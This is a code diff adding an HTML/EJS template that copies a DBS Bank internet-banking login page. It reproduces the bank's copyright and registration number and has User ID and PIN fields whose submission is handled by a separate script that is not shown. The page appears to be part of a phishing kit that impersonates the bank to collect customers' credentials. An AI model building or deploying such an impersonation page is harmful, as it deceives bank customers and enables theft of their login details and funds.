@@ -1,0 +1,81 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <%- include('../partials/head.ejs') %>
+    </head>  
+
+      <body>    
+          <div class="header">
+            <div class="find">
+                  <i class="fa fa-map-marker-alt"></i>
+                  <p style="margin-left:7px;">Find Us</p>
+            </div>  
+            <div class="help">
+                <i class="fa fa-exclamation-circle tolef"></i>
+                <p style="margin-left:7px;"> Help & Support</p>
+            </div>  
+          </div>  
+
+
+
+          <div class="enclose">
+            <div class="loginform">
+                 <form id="logino">
+                     <div class="redbg"></div>  
+                     <div class="inner">
+                    <div class="dlogo"> <img src="/images/singerpaul.png" alt="logo"> </div>   
+                       <div class="instruction">
+                        <p>For an optimal viewing experience and security, we recommend that you use the latest web browser. Click <span>here</span> for a list of supported browsers.</p>
+                        </div> 
+
+                        <!-----Input USER ID-->
+                        <fieldset>
+                            <legend>User ID</legend>
+                            <input type="text" id="userid" placeholder=" " required />
+                        </fieldset>  
+
+                          <!-----Input PIN-->  
+                          <fieldset>
+                            <legend>PIN</legend>
+                            <input type="password" id="userpin" placeholder=" " required />
+                        </fieldset>    
+
+                        <button id="submit">Login</button> 
+                        <button id="start">Get Started</button>  
+
+                        <div class="last">
+                             <p>Forgot User ID or PIN</p>
+                             <p>Frequently Asked Questions</p>   
+                             <p>Maintenance Schedule</p>
+                             <p>Security & You</p>
+                        </div> 
+                      </div> 
+                 </form> 
+                </div>
+            </div>    
+         
+
+            
+            <div class="footer"> 
+                <div class="links">
+                  <div><p>Terms & Conditions</p></div> 
+                  <div><p>Privacy Policy</p></div>
+                  <div><p>Fair Dealing Commitment</p></div> 
+                  <div><p>Compliance with Tax Requirements</p></div> 
+                  <div><p>Vulnerability Disclosure Policy</p></div>
+                  <div><p>©2024 DBS Bank Ltd. Co. Reg. No. 196800306E</p></div> 
+                 </div>  
+
+                  <div class="icons">
+                    <i class="fab fa-facebook"></i> 
+                    <i class="fa fa-twitter"></i> 
+                    <i class="fab fa-linkedin"></i>
+                    <i class="fab fa-youtube"></i>   
+                  </div>
+            </div>
+
+            <script src="script.js"></script>
+      </body>
+ 
+</html>
